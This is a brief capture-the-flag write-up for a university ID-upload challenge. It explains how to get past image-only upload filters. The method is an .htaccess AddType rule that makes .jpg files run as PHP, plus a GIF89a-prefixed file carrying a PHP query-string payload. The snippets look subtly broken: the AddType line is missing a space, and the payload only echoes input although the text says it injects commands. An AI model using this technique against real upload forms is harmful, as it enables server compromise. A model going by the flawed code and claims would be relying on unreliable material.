# bypass 
A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

## Solution
- If you take a first look on the website. It is just a file upload site.
- Uploading php files and disgusing php script as jpg file have blocked.
- So, You must make two files. One is .htaccess file, which adjusts configurations for directory.\
- write the .htaccess file like this :
```
AddType application/x-httpd-php.jpg
```
It means that It treats every .jpg like It's php file.

Second, You must craft image file. Like this example:

```
GIF89a;
<?=@$_GET[0]?>
```

GIF89a; means image magic bytes so you can decieves image checking.
And <?=@$_GET[0]?> means You can inject comnmands in querystring.
 

